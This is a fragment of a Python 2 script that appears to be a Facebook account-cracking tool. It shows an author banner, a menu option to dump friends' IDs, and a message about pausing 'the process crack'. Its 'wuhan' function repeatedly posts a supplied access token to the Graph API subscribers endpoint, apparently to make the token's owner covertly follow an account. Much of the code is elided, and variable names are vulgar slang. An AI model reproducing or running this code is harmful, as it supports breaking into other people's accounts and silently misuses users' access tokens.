...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Hasan
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/
...
def moch_yayan():
    ...
    print ' [%s2%s]. Dump id of public friends'%(O,N);time.sleep(0.03)
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
...
def info_tools():
    ...
    print '\n %s[%s>%s] Yt       : Hasan.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Website  : https://www.my.id'%(N,H,N);time.sleep(0.07)
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            print '\n [%s!%s] anda bisa turn off cellular data to pause the process crack\n'%(M,N)
